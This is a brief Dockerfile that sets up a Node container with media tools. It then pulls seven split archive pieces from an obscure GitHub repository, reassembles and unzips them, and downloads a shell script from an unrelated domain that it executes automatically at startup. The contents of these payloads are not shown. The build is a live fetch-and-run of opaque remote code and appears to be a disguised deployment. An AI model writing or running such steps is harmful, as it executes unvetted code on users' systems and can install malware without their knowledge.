FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/Kayquecomi/Kkkk/raw/main/aa https://github.com/Kayquecomi/Kkkk/raw/main/ab https://github.com/Kayquecomi/Kkkk/raw/main/ac https://github.com/Kayquecomi/Kkkk/raw/main/ad https://github.com/Kayquecomi/Kkkk/raw/main/ae https://github.com/Kayquecomi/Kkkk/raw/main/af https://github.com/Kayquecomi/Kkkk/raw/main/ag
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 5000 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
